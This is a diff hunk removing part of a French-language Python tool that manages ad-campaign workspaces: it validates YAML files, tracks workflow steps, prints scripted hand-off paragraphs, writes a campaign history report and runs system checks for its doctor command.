-        if not re.fullmatch(r"CO\d{2,}", code):
-            errors.append(f"library/competitors.yaml : code « {code} » invalide (CO01, CO02…)")
-        if code in seen_co:
-            errors.append(f"library/competitors.yaml : code {code} en double")
-        seen_co.add(code)
-        if not c.get("page_url"):
-            warnings.append(f"library/competitors.yaml : {code} sans adresse de page produit (page_url)")
-        if c.get("page_url") and not c.get("read_on"):
-            warnings.append(f"library/competitors.yaml : {code} sans date de lecture (read_on)")
-    found = scan_codes(P, ws)
-    for k in CODE_PREFIXES:
-        if found[k] > state["counters"][k]:
-            errors.append(f"state.yaml : le compteur {k} ({state['counters'][k]}) est en dessous de {k}{found[k]:02d} "
-                          "déjà utilisé ; lance « ws.py repair »")
-    for ads_file in sorted((P["root"] / "cycles").glob("*/ads.yaml")):
-        data = load_yaml(ads_file, {}) or {}
-        ads = data.get("ads") if isinstance(data, dict) else None
-        if ads is None or not isinstance(ads, list):
-            errors.append(f"{ads_file.relative_to(P['root'])} : il faut une liste « ads »")
-            continue
-        names = set()
-        for ad in ads:
-            if not isinstance(ad, dict):
-                errors.append(f"{ads_file.relative_to(P['root'])} : entrée « {ad} » sans clés")
-                continue
-            code = str(ad.get("code", ""))
-            if not re.fullmatch(r"C\d{2,} V\d+ [A-Z]", code):
-                errors.append(f"{ads_file.relative_to(P['root'])} : code de pub « {code} » invalide (ex. C04 V2 B)")
-            if code in names:
-                errors.append(f"{ads_file.relative_to(P['root'])} : pub {code} en double")
-            names.add(code)
-            if ad.get("status") and ad["status"] not in AD_STATUSES:
-                errors.append(f"{ads_file.relative_to(P['root'])} : statut « {ad['status']} » inconnu pour {code}")
-    return errors, warnings
-
-
-def cmd_check(a):
-    P, ws, state = open_ws(a.folder)
-    errors, warnings = validate(P, ws, state)
-    for w in warnings:
-        print("attention : " + w)
-    for e in errors:
-        print("ERREUR : " + e)
-    print(f"{len(errors)} erreur(s), {len(warnings)} avertissement(s).")
-    if not errors:
-        refresh(P, ws, state)
-    sys.exit(1 if errors else 0)
-
-
-# 1.4, 15/11/2026 (Richie): after every output the suite itself says what the person now has and what comes next,
-# in one short paragraph that ends on one question. Hard-coded here so it never depends on the conversation:
-# every step that finishes goes through set_step, the book through docs.py, the page through offer.py page.
-# Claude ends its reply with this paragraph in its own words, once, as its last lines. Never a list, never pushy.
-HANDOFF = {
-    "intake": {
-        "*": "Tu as ta fiche d'entrée : ce qu'une {one} peut coûter en pub et si ton pixel compte juste. La suite, "
-             "c'est l'offre et la page : je lis les pages des concurrents dont les pubs tournent depuis des semaines, "
-             "et je compare avec la tienne. On s'y met ?",
-    },
-    "offer": {
-        "*": "Ton offre est chiffrée et ta page a son brief, section par section. Si tu veux, j'écris la page entière à "
-             "partir d'une page qui vend déjà (dis « écris ma page »). La suite : les références, les pubs et les "
-             "vidéos qui ont déjà vendu dans ton marché. Je lance la recherche ?",
-    },
-    "research": {
-        "*": "Tes références sont trouvées, transcrites et lues. La suite : les avatars (à qui on parle), les angles "
-             "et le système de créas à tester. Je les écris ?",
-    },
-    "strategy": {
-        "*": "Ta stratégie est posée : les avatars, le trio testé et les créas à produire. La suite : les briefs, une "
-             "page par créa que ton monteur ou ton IA peut suivre sans t'appeler. Je les écris ?",
-    },
-    "briefs": {
-        "*": "Tes briefs sont prêts{book}. Maintenant c'est à toi : produis les vidéos (toi, ton monteur ou l'IA), "
-             "nomme chaque fichier par son code (C01, C02…), puis envoie-les-moi : je contrôle chacune avant qu'un "
-             "franc ne parte. Tu veux que je répartisse qui produit quoi et pour quand ?",
-    },
-    "production": {
-        "*": "Toutes les créas sont livrées. La suite : le contrôle, vidéo par vidéo, contre son brief. Je les "
-             "regarde ?",
-    },
-    "review": {
-        "*": "Le contrôle est fait : chaque créa est bonne à lancer, à corriger ou à refaire, et chaque correction a "
-             "son message prêt pour celui qui l'a faite. Quand elles sont toutes bonnes, dis « lance » et j'écris ta "
-             "fiche de lancement. On lance ?",
-    },
-    "launch": {
-        "*": "Ta campagne est prête à créer, nom par nom. Une fois en ligne, ne touche à rien pendant 3 jours. Au jour "
-             "3 puis au jour 7, envoie-moi l'export au niveau des pubs (colonnes « Lecture créa ») : je te dis quoi "
-             "couper, quoi garder, et pourquoi. Tu me dis le jour où elle part ?",
-        "webinar": "Ta campagne est prête à créer, nom par nom. Elle tourne 7 à 10 jours avant le live et s'arrête le "
-                   "jour du live. Ne touche à rien pendant 3 jours, puis envoie-moi l'export au niveau des pubs : il "
-                   "reste assez de jours pour couper les perdantes et pousser les gagnantes avant le live. Après le "
-                   "live, donne-moi les inscrits, les présents et les ventes. Tu me dis le jour où elle part ?",
-    },
-    "read": {
-        "*": "Tu sais quoi couper, quoi garder et pourquoi, et le registre des gagnants dit quelle part de ta formule a "
-             "gagné. Fais ces gestes dans le Gestionnaire aujourd'hui. La suite : les variations des gagnantes, le "
-             "prochain lot de pubs à produire. Je les prépare ?",
-        "webinar": "Tu sais quoi couper, quoi garder et pourquoi. Fais ces gestes dans le Gestionnaire aujourd'hui. "
-                   "La suite : les variations des gagnantes pour le prochain live, et les pubs pour ceux qui se sont "
-                   "inscrits sans venir. Je les prépare ?",
-    },
-    "iterate": {
-        "*": "Le prochain cycle est ouvert avec ses variations, chacune ne change qu'une chose. La suite : leurs "
-             "briefs, puis la même boucle (produire, contrôler, lancer, lire). J'écris les briefs ?",
-    },
-    "book": {
-        "*": "Ton document de stratégie est relié, en Word et en PDF{parts}. {after}",
-    },
-    "page": {
-        "*": "Ta page est écrite section par section contre une page qui vend, chaque changement expliqué. Remplis les "
-             "[__] (tes chiffres, tes preuves), mets-la en ligne, puis envoie-moi le lien : je la relis sur téléphone "
-             "comme un visiteur. Tu veux que j'écrive aussi le texte de la pub qui y mène ?",
-    },
-}
-HANDOFF_ONE = {"product": "commande", "digital": "vente", "webinar": "inscription"}
-
-
-def handoff(P, sid, ws=None, state=None):
-    """The paragraph that closes a step: what the person has now, what comes next, one question."""
-    ws = ws if ws is not None else (load_yaml(P["workspace"], {}) or {})
-    kind = ws.get("kind") or "product"
-    texts = HANDOFF.get(sid) or {}
-    text = texts.get(kind) or texts.get("*")
-    if not text:
-        return ""
-    book = parts = after = ""
-    if sid in ("briefs", "book"):
-        bs = book_status(P)
-        if sid == "briefs" and state is not None and book_mode(ws, state):
-            book = ", et ton document complet se relie avec eux (en Word et en PDF)"
-        n = len(bs["have"])
-        parts = f", {n} partie{'s' if n > 1 else ''} sur 5" if n < 5 else ", complet"
-        after = (HANDOFF["briefs"]["*"].split(". ", 1)[1] if n >= 5 else
-                 "Ta stratégie complète arrive en une fois, après les briefs. On passe à l'étape suivante ?")
-    return "La suite — " + text.format(one=HANDOFF_ONE.get(kind, "commande"), book=book, parts=parts, after=after)
-
-
-def set_step(P, state, sid, status, note=None, outputs=None):
-    info = state["steps"].setdefault(sid, {})
-    info["status"] = status
-    info["date"] = today()
-    if outputs:
-        info["outputs"] = sorted(set((info.get("outputs") or []) + outputs))
-    if status == "done":
-        try:
-            msg = handoff(P, sid, state=state)
-        except Exception:  # noqa: BLE001 — the hand-off never stops a step
-            msg = ""
-        if msg:
-            print("\n" + msg)
-
-
-def cmd_step(a):
-    P, ws, state = open_ws(a.folder)
-    if a.step not in step_ids():
-        raise WsError(f"étape inconnue « {a.step} ». Étapes : {', '.join(step_ids())}")
-    if a.status not in STATUSES:
-        raise WsError(f"statut inconnu « {a.status} » ({', '.join(STATUSES)})")
-    product = load_product(P)
-    miss = missing_facts(ws, product)
-    if a.step == "intake" and a.status == "done" and miss:
-        raise WsError("intake ne peut pas être marquée faite, il manque : " + "; ".join(miss)
-                      + ". Pour avancer quand même : ws.py step <dossier> intake skipped --note \"pourquoi\"")
-    set_step(P, state, a.step, a.status, outputs=a.output)
-    extra = ""
-    if a.step == "intake" and a.status == "skipped" and miss:
-        extra = " (sautée avec des faits manquants : " + "; ".join(miss) + ")"
-        print("attention : intake sautée alors qu'il manque : " + "; ".join(miss))
-    journal(P, f"Étape {a.step} → {STATUS_FR[a.status]}{extra}" + (f". {a.note}" if a.note else "")
-            + (f" Sorties : {', '.join(a.output)}." if a.output else ""))
-    if a.status == "done" and a.step in STEP_DOC:
-        if a.step in BOOK_STEPS and book_mode(ws, state):
-            # 1.7.3 (Richie, 24/11/2026): one strategy document, made once when the briefs are done; no partial
-            # versions handed over at each step. A « version de travail » only when the work stops before the end.
-            if a.step == BOOK_STEPS[-1]:
-                print("Document complet, à relier maintenant (une seule fois, toutes les parties) : " + docs_cmd(P, "--book"))
-            else:
-                print("Pas de document à cette étape : la stratégie complète se relie en une fois, après les briefs. "
-                      "Enchaîne l'étape suivante. Si le travail s'arrête avant (fin de session, licence), relie une "
-                      "version de travail pour l'utilisateur : " + docs_cmd(P, "--book"))
-        elif (P["root"] / "deliverables" / f"{STEP_DOC[a.step]}.md").exists():
-            print("Document de l'étape : " + docs_cmd(P, STEP_DOC[a.step]))
-    print(refresh(P, ws, state))
-
-
-def cmd_start(a):
-    P, ws, state = open_ws(a.folder)
-    ids = step_ids()
-    if a.step not in ids:
-        raise WsError(f"étape inconnue « {a.step} ». Étapes : {', '.join(ids)}")
-    skipped = []
-    for s in ids[:ids.index(a.step)]:
-        if state["steps"][s].get("status") in ("todo", "doing"):
-            set_step(P, state, s, "skipped")
-            skipped.append(s)
-    set_step(P, state, a.step, "doing")
-    journal(P, f"On commence par l'étape {a.step}. Raison : {a.reason or 'non précisée'}."
-            + (f" Sautées : {', '.join(skipped)}." if skipped else ""))
-    print(refresh(P, ws, state))
-
-
-CYCLE_CHECKS = ("briefs_", "production_", "review_", "launch_", "read_")
-
-
-def cmd_cycle(a):
-    P, ws, state = open_ws(a.folder)
-    ids = step_ids()
-    frm = a.start_from or ("briefs" if state["steps"].get("iterate", {}).get("status") == "done" else "strategy")
-    if frm not in CYCLE_FROM:
-        raise WsError(f"--from doit être l'un de : {', '.join(CYCLE_FROM)}")
-    in_progress = [s for s in ids[ids.index(frm):] if state["steps"][s].get("status") == "doing"]
-    if in_progress and not a.force:
-        raise WsError(f"étape(s) encore en cours dans ce cycle : {', '.join(in_progress)}. Termine-les, ou ajoute --force.")
-    if in_progress:
-        print(f"attention : étape(s) encore en cours ({', '.join(in_progress)}) ; le nouveau cycle est ouvert quand même.")
-    elif not any(state["steps"][s].get("status") == "done" for s in ids[ids.index(frm):]):
-        print("attention : aucune étape de ce cycle n'est faite ; le nouveau cycle est ouvert quand même.")
-    state["cycle"] += 1
-    state["cycle_from"] = frm   # a cycle that redoes the research or the strategy gets a complete document again
-    c = state["cycle"]
-    for sub in ("briefs", "creatives", "launch", "results"):
-        (P["root"] / "cycles" / f"cycle-{c:02d}" / sub).mkdir(parents=True, exist_ok=True)
-    new_cycle_files(P["root"], c)
-    for s in ids[ids.index(frm):]:
-        state["steps"][s] = {"status": "todo"}
-    au = P["root"] / "audit.yaml"
-    if au.exists():   # the checks of one cycle's ads say nothing about the next one's
-        data = load_yaml(au, {}) or {}
-        checks = data.get("checks") if isinstance(data.get("checks"), dict) else None
-        if checks is not None:
-            gone = [k for k in checks if k.startswith(CYCLE_CHECKS)]
-            for k in gone:
-                checks.pop(k)
-            if gone:
-                dump_yaml(au, data)
-    journal(P, f"Nouveau cycle {c}, à partir de l'étape {frm}. Les idées gardent leurs numéros "
-               f"(prochaine idée neuve : C{state['counters']['C'] + 1:02d}).")
-    print(refresh(P, ws, state))
-
-
-# ---------------------------------------------------------------- the long run: every product, a product's history
-
-SKIP_DIRS = {"References", "cycles", "library", "data", "deliverables", "creatives", "briefs", "node_modules"}
-
-
-def find_workspaces(root, depth=3):
-    """Every product folder (one with workspace.yaml) in root and its subfolders, without entering a product."""
-    out = []
-
-    def walk(d, n):
-        if (d / "workspace.yaml").exists():
-            out.append(d)
-            return
-        if n == 0:
-            return
-        try:
-            subs = sorted(x for x in d.iterdir() if x.is_dir() and x.name not in SKIP_DIRS and not x.name.startswith("."))
-        except OSError:
-            return
-        for x in subs:
-            walk(x, n - 1)
-
-    walk(root, depth)
-    return out
-
-
-def ledger_rows(P, cycle):
-    data = load_yaml(P["root"] / "cycles" / f"cycle-{int(cycle):02d}" / "ads.yaml", {}) or {}
-    return [x for x in (data.get("ads") or []) if isinstance(x, dict) and x.get("code")]
-
-
-def reminders(P, state, rows):
-    """What the calendar and the files say, without anyone remembering: day 3 and day 7 of the test, an export or a
-    delivery report not read yet, delivered videos waiting for their check."""
-    out = []
-    today_ = dt.date.today()
-    launched = []
-    for x in rows:
-        try:
-            launched.append(dt.date.fromisoformat(str(x.get("launched_on"))[:10]))
-        except ValueError:
-            pass
-    read_done = state["steps"].get("read", {}).get("status") == "done"
-    if launched and not read_done:
-        days = (today_ - min(launched)).days
-        if days >= 7:
-            out.append(f"Jour {days} du test : la lecture est due. Il faut l'export « Lecture créa » au niveau des pubs, "
-                       "les deux répartitions et le rapport de livraison.")
-        elif days >= 3:
-            out.append(f"Jour {days} du test : premier point possible (seulement les échecs évidents ; on juge au jour 7).")
-    res_dir = P["root"] / "cycles" / f"cycle-{int(state['cycle']):02d}" / "results"
-    seen = max((f.stat().st_mtime for f in res_dir.glob("*.yaml")), default=0) if res_dir.exists() else 0
-    for sub, what in (("exports", "Nouvel export"), ("deliveries", "Nouveau rapport de livraison")):
-        d = P["root"] / "data" / sub
-        new = [f.name for f in d.glob("*") if f.is_file() and f.stat().st_mtime > seen] if d.exists() else []
-        if new and launched:
-            out.append(f"{what} pas encore lu : {', '.join(sorted(new)[:3])}")
-    waiting = [x["code"] for x in rows if x.get("status") == "review"]
-    if waiting:
-        out.append(f"Vidéo(s) livrée(s) à contrôler : {', '.join(waiting)}")
-    return out
-
-
-def cmd_overview(a):
-    """« Qu'est-ce que je fais aujourd'hui ? » — every product of the folder: where it stands, what to do now."""
-    need_yaml()
-    root = Path(a.folder).expanduser().resolve()
-    found = find_workspaces(root)
-    if not found:
-        raise WsError(f"aucun produit (workspace.yaml) dans {root} ni dans ses sous-dossiers")
-    day = today()
-    lines = [f"# Aujourd'hui, {dt.date.today().strftime('%d/%m/%Y')} — {len(found)} produit(s)", ""]
-    for d in found:
-        try:
-            P, ws, state = open_ws(d)
-            nxt = refresh(P, ws, state)
-        except WsError as e:
-            lines += [f"## {d.name}", "", f"- ⚠️ {e}", ""]
-            continue
-        cur = next((s for s in step_ids() if state["steps"][s].get("status") in ("doing", "todo")), None)
-        rows = ledger_rows(P, state["cycle"])
-        live = [x["code"] for x in rows if x.get("status") == "live"]
-        late = [x["code"] for x in rows if x.get("status") in ("brief", "production") and x.get("due")
-                and str(x.get("due")) < day]
-        lines += [f"## {ws.get('name')}", "", f"- Dossier : {d}",
-                  f"- Cycle {state['cycle']} · {step_label(cur) if cur else 'cycle terminé'} · {PATH_FR[path_of(ws)]}",
-                  f"- Maintenant : {nxt}"]
-        if live:
-            lines.append(f"- En ligne : {len(live)} pub(s)")
-        if late:
-            lines.append(f"- En retard en production : {', '.join(late)}")
-        for alert in reminders(P, state, rows):
-            lines.append(f"- ⏰ {alert}")
-        if book_mode(ws, state):
-            bs = book_status(P)
-            lines.append(f"- Document complet : {len(bs['have'])} partie(s) sur 5"
-                         + (" (à relier)" if bs["stale"] else ""))
-        if P["journal"].exists():
-            tail = [l for l in read_text(P["journal"]).splitlines() if l.startswith("- ")][-1:]
-            if tail:
-                lines.append(f"- Dernière décision : {tail[0][2:]}")
-        lines.append("")
-    print("\n".join(lines))
-
-
-def _num(v):
-    try:
-        return float(str(v).replace(",", ".").replace(" ", ""))
-    except (TypeError, ValueError):
-        return None
-
-
-def _fmt(v, pct=False):
-    if v is None:
-        return "—"
-    if pct:
-        return f"{v * 100:.1f} %" if v <= 1 else f"{v:.1f} %"
-    return f"{v:,.0f}".replace(",", " ") if abs(v) >= 100 else f"{v:.2f}".rstrip("0").rstrip(".")
-
-
-STATUS_LABEL = {"brief": "brief", "production": "en production", "review": "au contrôle", "ready": "prête",
-                "live": "en ligne", "paused": "en pause", "killed": "coupée", "winner": "gagnante"}
-
-
-def cmd_bilan(a):
-    """The product's history, every cycle: what ran, what won, what was cut and why, each idea and its variations,
-    each avatar, the account's own reference points. Out: deliverables/BILAN.md (then docs.py <dossier> BILAN)."""
-    P, ws, state = open_ws(a.folder)
-    avatars = {}
-    for x in (load_yaml(P["root"] / "library" / "avatars.yaml", {}) or {}).get("avatars") or []:
-        key = x.get("n", x.get("id")) if isinstance(x, dict) else None
-        if key is not None:
-            avatars[str(key)] = x.get("short") or x.get("name") or ""
-    cur = (ws.get("markets") or [{}])[0].get("currency", "") if ws.get("markets") else ""
-    cycles = [(c, ledger_rows(P, c)) for c in range(1, int(state["cycle"]) + 1)]
-    allrows = [(c, x) for c, rows in cycles for x in rows]
-    res = lambda x: x.get("results") if isinstance(x.get("results"), dict) else {}
-    spend = sum(_num(res(x).get("spend")) or 0 for _, x in allrows)
-    buys = sum(_num(res(x).get("purchases")) or 0 for _, x in allrows)
-    launched = [(c, x) for c, x in allrows if x.get("launched_on") or _num(res(x).get("spend"))]
-    wins = [x["code"] for _, x in allrows if x.get("status") == "winner"]
-    cut = [x["code"] for _, x in allrows if x.get("status") == "killed"]
-    L = [f"# Bilan — {ws.get('name')}", "",
-         f"*Au {dt.date.today().strftime('%d/%m/%Y')} · {state['cycle']} cycle(s) de test · "
-         f"{len(launched)} pub(s) lancée(s)*", "", "## En bref", ""]
-    L.append(f"- Dépense : {_fmt(spend)} {cur} · achats : {_fmt(buys)}"
-             + (f" · coût par achat : {_fmt(spend / buys)} {cur}" if buys else ""))
-    L.append(f"- Gagnantes : {', '.join(wins) if wins else 'aucune pour l’instant'}")
-    L.append(f"- Coupées : {len(cut)}")
-    L.append(f"- Maintenant : {state.get('next') or compute_next(ws, load_product(P), state, P)}")
-    L.append("")
-    L += ["## Cycle par cycle", ""]
-    for c, rows in cycles:
-        if not rows:
-            continue
-        dates = sorted(str(x["launched_on"]) for x in rows if x.get("launched_on"))
-        L += [f"### Cycle {c}" + (f" · lancé le {dates[0]}" if dates else ""), "",
-              "| Pub | Avatar | Format | Statut | Dépense | Achats | Coût par achat | Accroche | Verdict |",
-              "|---|---|---|---|---|---|---|---|---|"]
-        for x in rows:
-            r = res(x)
-            v = r.get("verdict") if isinstance(r.get("verdict"), dict) else {}
-            why = "; ".join(v.get("causes") or []) if isinstance(v.get("causes"), list) else ""
-            av = str(x.get("avatar") or "")
-            L.append(" | ".join(["", x["code"], (avatars.get(av) or av or "—"), str(x.get("format") or "—"),
-                                 STATUS_LABEL.get(x.get("status"), str(x.get("status") or "—")),
-                                 _fmt(_num(r.get("spend"))), _fmt(_num(r.get("purchases"))), _fmt(_num(r.get("cpa"))),
-                                 _fmt(_num(r.get("hook")), pct=True),
-                                 (why or "—").replace("|", "/"), ""]).strip())
-        L.append("")
-    ideas = {}
-    for c, x in allrows:
-        ideas.setdefault(x["code"].split()[0], []).append((c, x))
-    if ideas:
-        L += ["## Chaque idée et ses variations", ""]
-        for idea in sorted(ideas):
-            parts = []
-            for c, x in ideas[idea]:
-                ch = f" ({x['change']})" if x.get("change") else ""
-                parts.append(f"{x['code']} {STATUS_LABEL.get(x.get('status'), x.get('status') or '')}{ch}, cycle {c}")
-            L.append(f"- **{idea}** : " + " → ".join(parts))
-        L.append("")
-    if avatars or any(x.get("avatar") for _, x in allrows):
-        L += ["## Les avatars", "", "| Avatar | Pubs lancées | Gagnantes | Coupées |", "|---|---|---|---|"]
-        keys = sorted({str(x.get("avatar")) for _, x in allrows if x.get("avatar")} | set(avatars))
-        for k in keys:
-            mine = [x for _, x in allrows if str(x.get("avatar")) == k]
-            L.append(f"| {avatars.get(k) or k} | {sum(1 for x in mine if x.get('launched_on'))} | "
-                     f"{sum(1 for x in mine if x.get('status') == 'winner')} | "
-                     f"{sum(1 for x in mine if x.get('status') == 'killed')} |")
-        L.append("")
-    bench = (load_yaml(P["root"] / "library" / "benchmarks.yaml", {}) or {}).get("cycles") or {}
-    if bench:
-        L += ["## Les repères du compte (médianes, cycle par cycle)", "",
-              "| Cycle | Accroche | Rétention | CTR lien | CPM | Coût par achat |", "|---|---|---|---|---|---|"]
-        for k in sorted(bench):
-            b = bench[k] if isinstance(bench[k], dict) else {}
-            L.append(f"| {k.replace('cycle-', '')} | {_fmt(_num(b.get('hook')), True)} | {_fmt(_num(b.get('hold')), True)} | "
-                     f"{_fmt(_num(b.get('ctr_link')), True)} | {_fmt(_num(b.get('cpm')))} | {_fmt(_num(b.get('cpa')))} |")
-        L.append("")
-    if not allrows:
-        L += ["Aucune pub dans le registre pour l'instant : le bilan se remplit dès le premier lancement.", ""]
-    out = P["root"] / "deliverables" / "BILAN.md"
-    out.parent.mkdir(parents=True, exist_ok=True)
-    out.write_text("\n".join(L) + "\n", encoding="utf-8", newline="\n")
-    journal(P, f"Bilan écrit : {len(launched)} pub(s) lancée(s) sur {state['cycle']} cycle(s), {len(wins)} gagnante(s).")
-    print(f"Écrit : {out}\nEn Word et PDF : " + docs_cmd(P, "BILAN"))
-
-
-def cmd_code(a):
-    P, ws, state = open_ws(a.folder)
-    pre = a.prefix.upper()
-    if pre not in CODE_PREFIXES:
-        raise WsError(f"préfixe inconnu « {pre} » ({', '.join(CODE_PREFIXES)})")
-    found = scan_codes(P, ws)
-    nxt = max(state["counters"][pre], found[pre]) + 1
-    state["counters"][pre] = nxt
-    dump_yaml(P["state"], state)
-    print(f"{pre}{nxt:02d}")
-
-
-def cmd_log(a):
-    P, ws, state = open_ws(a.folder)
-    if not a.text.strip():
-        raise WsError("le texte du journal est vide")
-    journal(P, a.text.strip())
-    refresh(P, ws, state)
-    print("noté.")
-
-
-SETTABLE = {"mode": MODES, "stage": STAGES, "programme": PROGRAMMES, "kind": KINDS, "path": PATHS,
-            "destination": DESTINATIONS, "avatars": None, "name": None, "business": None,
-            "language": None, "goal": None, "budget_daily": None, "team": None}
-
-
-# the francophone markets the suite meets most, so « market=CM » is enough (webinar v3, 13/11/2026: markets had to be
-# added by editing workspace.yaml by hand)
-KNOWN_MARKETS = {
-    "CI": ("Côte d'Ivoire", "XOF"), "BJ": ("Bénin", "XOF"), "SN": ("Sénégal", "XOF"), "TG": ("Togo", "XOF"),
-    "BF": ("Burkina Faso", "XOF"), "ML": ("Mali", "XOF"), "NE": ("Niger", "XOF"), "GW": ("Guinée-Bissau", "XOF"),
-    "CM": ("Cameroun", "XAF"), "GA": ("Gabon", "XAF"), "CG": ("Congo", "XAF"), "TD": ("Tchad", "XAF"),
-    "CF": ("Centrafrique", "XAF"), "GQ": ("Guinée équatoriale", "XAF"), "CD": ("RD Congo", "CDF"),
-    "GN": ("Guinée", "GNF"), "MA": ("Maroc", "MAD"), "DZ": ("Algérie", "DZD"), "TN": ("Tunisie", "TND"),
-    "MG": ("Madagascar", "MGA"), "FR": ("France", "EUR"), "BE": ("Belgique", "EUR"), "CH": ("Suisse", "CHF"),
-    "CA": ("Canada", "CAD"),
-}
-
-
-def cmd_set(a):
-    P, ws, state = open_ws(a.folder)
-    items = a.assignment if isinstance(a.assignment, list) else [a.assignment]
-    for it in items:
-        if "=" not in it:
-            raise WsError(f"« {it} » : format attendu clé=valeur (ex. mode=hybrid), plusieurs séparés par un espace")
-    if len(items) > 1:
-        for it in items:
-            cmd_set(argparse.Namespace(folder=a.folder, assignment=[it]))
-        return
-    key, val = [x.strip() for x in items[0].split("=", 1)]
-    if key in ("market", "markets"):
-        mk = ws.setdefault("markets", [])
-        for v in [x.strip() for x in val.split(",") if x.strip()]:
-            if v.startswith("-"):
-                code = v[1:].upper()
-                ws["markets"] = mk = [m for m in mk if not (isinstance(m, dict) and m.get("code") == code)]
-                journal(P, f"Marché retiré : {code}")
-                continue
-            m = parse_market(v if ":" in v else v.upper())
-            if m["code"] in KNOWN_MARKETS and not m["country"]:
-                m["country"], m["currency"] = KNOWN_MARKETS[m["code"]]
-            first = next((x for x in mk if isinstance(x, dict)), {})
-            if ":" not in v and first.get("payment"):
-                m["payment"] = first["payment"]   # same payment as the markets already there
-            if any(isinstance(x, dict) and x.get("code") == m["code"] for x in mk):
-                print(f"{m['code']} est déjà dans les marchés.")
-                continue
-            mk.append(m)
-            journal(P, f"Marché ajouté : {m['code']} ({m['country'] or '?'})")
-        dump_yaml(P["workspace"], ws)
-        print(f"Marchés : {', '.join(x.get('code', '?') for x in mk if isinstance(x, dict))}")
-        print(refresh(P, ws, state))
-        return
-    if not key or (not val and key in ("name", "mode", "stage", "programme", "kind", "channels") or key.endswith(".")):
-        raise WsError(f"« {items[0]} » : il manque la clé ou la valeur")
-    md = modes_data()
-    if key.startswith("engines."):
-        task = key.split(".", 1)[1]
-        if task not in md["tasks"] or val not in md["engines"]:
-            raise WsError(f"tâche ou outil inconnu : {task} = {val}. Tâches : {', '.join(md['tasks'])}")
-        ws.setdefault("engines", {})[task] = val
-    elif key in ("capacity.machine", "capacity.claude"):
-        sub = key.split(".", 1)[1]
-        if val not in md["capacity"][sub]:
-            raise WsError(f"{key} doit être l'un de : {', '.join(md['capacity'][sub])}")
-        ws.setdefault("capacity", {})[sub] = val
-    elif re.fullmatch(r"(accounts|brand)\.[a-z_]+", key):
-        top, sub = key.split(".", 1)
-        ws.setdefault(top, {})[sub] = val
-    elif key == "channels":
-        chans = [c.strip() for c in val.split(",") if c.strip()]
-        bad = [c for c in chans if c not in ("meta", "tiktok")]
-        if bad or not chans:
-            raise WsError("channels : meta, tiktok, ou les deux séparés par une virgule")
-        ws["channels"] = chans
-    elif key in SETTABLE:
-        if SETTABLE[key] and val not in SETTABLE[key]:
-            raise WsError(f"{key} doit être l'un de : {', '.join(SETTABLE[key])}")
-        ws[key] = val
-    else:
-        raise WsError(f"clé non modifiable par set : {key}. Un marché : market=CM (market=-CM pour le retirer).")
-    dump_yaml(P["workspace"], ws)
-    journal(P, f"Réglage : {key} = {val}")
-    if key in ("mode",) or key.startswith("engines."):
-        state["effective_engines"] = {}
-        print("Formule ou outils changés : relance « ws.py doctor <dossier> » pour vérifier cet ordinateur.")
-    print(refresh(P, ws, state))
-
-
-def cmd_repair(a):
-    need_yaml()
-    P = paths_of(a.folder)
-    if not P["workspace"].exists():
-        raise WsError(f"pas de workspace.yaml dans {P['root']}")
-    ws = load_yaml(P["workspace"], {})
-    if not isinstance(ws, dict):
-        raise WsError("workspace.yaml n'a pas la bonne forme : restaure workspace.yaml.bak d'abord.")
-    P = paths_of(a.folder, ws)
-    old = None
-    try:
-        old = load_yaml(P["state"]) if P["state"].exists() else None
-    except WsError:
-        old = None
-    if not isinstance(old, dict) and P["state"].with_name("state.yaml.bak").exists():
-        try:
-            old = load_yaml(P["state"].with_name("state.yaml.bak"))
-            print("état repris depuis state.yaml.bak")
-        except WsError:
-            old = None
-    state = new_state()
-    removed = []
-    if isinstance(old, dict):
-        for s, info in (old.get("steps") or {}).items() if isinstance(old.get("steps"), dict) else []:
-            if s in state["steps"] and isinstance(info, dict) and info.get("status") in STATUSES:
-                state["steps"][s] = info
-            elif s not in state["steps"]:
-                removed.append(s)
-        try:
-            state["cycle"] = int(old.get("cycle", 1))
-        except (TypeError, ValueError):
-            pass
-        for k, v in (old.get("counters") or {}).items() if isinstance(old.get("counters"), dict) else []:
-            if k in state["counters"]:
-                try:
-                    state["counters"][k] = int(v)
-                except (TypeError, ValueError):
-                    pass
-    cycles = [int(m.group(1)) for d in (P["root"] / "cycles").glob("cycle-*")
-              for m in [re.fullmatch(r"cycle-(\d+)", d.name)] if m]
-    state["cycle"] = max([state["cycle"]] + cycles)
-    found = scan_codes(P, ws)
-    state["counters"] = {k: max(state["counters"][k], found[k]) for k in CODE_PREFIXES}
-    journal(P, "state.yaml réparé : compteurs recalculés depuis les fichiers"
-            + (f", étapes retirées : {', '.join(removed)}" if removed else "") + ".")
-    print(refresh(P, ws, state))
-
-
-# ---------------------------------------------------------------- doctor
-
-PIP = {"yt_dlp": "yt-dlp", "faster_whisper": "faster-whisper", "google.genai": "google-genai",
-       "docx": "python-docx", "pymupdf": "pymupdf", "PIL": "pillow", "av": "av", "yaml": "pyyaml",
-       "openpyxl": "openpyxl", "imageio_ffmpeg": "imageio-ffmpeg"}
-
-
-def has_module(name):
-    try:
-        return importlib.util.find_spec(name) is not None
-    except (ImportError, ValueError):
-        return False
-
-
-def env_state(name):
-    """('process'|'registry'|None, value)."""
-    v = os.environ.get(name)
-    if v:
-        return "process", v
-    if WIN and not os.environ.get("CSOS_NO_REGISTRY_KEYS"):   # tests: only the process environment counts
-        try:
-            import winreg
-            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment") as k:
-                return "registry", winreg.QueryValueEx(k, name)[0]
-        except OSError:
-            pass
-    return None, None
-
-
-def ram_mb():
-    fake = os.environ.get("WS_FAKE_RAM")  # test hook: "total,avail"
-    if fake:
-        t, av = fake.split(",")
-        return int(t), int(av)
-    try:
-        if WIN:
-            import ctypes
-
-            class MS(ctypes.Structure):
-                _fields_ = [("l", ctypes.c_ulong), ("load", ctypes.c_ulong), ("total", ctypes.c_ulonglong),
-                            ("avail", ctypes.c_ulonglong), ("a", ctypes.c_ulonglong), ("b", ctypes.c_ulonglong),
-                            ("c", ctypes.c_ulonglong), ("d", ctypes.c_ulonglong), ("e", ctypes.c_ulonglong)]
-            s = MS()
-            s.l = ctypes.sizeof(MS)
-            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(s))
-            return int(s.total // 2 ** 20), int(s.avail // 2 ** 20)
-        pages, size = os.sysconf("SC_PHYS_PAGES"), os.sysconf("SC_PAGE_SIZE")
-        return int(pages * size // 2 ** 20), int(os.sysconf("SC_AVPHYS_PAGES") * size // 2 ** 20)
-    except Exception:
-        return None, None
-
-
-def find_word():
-    if not WIN:
-        return Path("/Applications/Microsoft Word.app").exists() or None
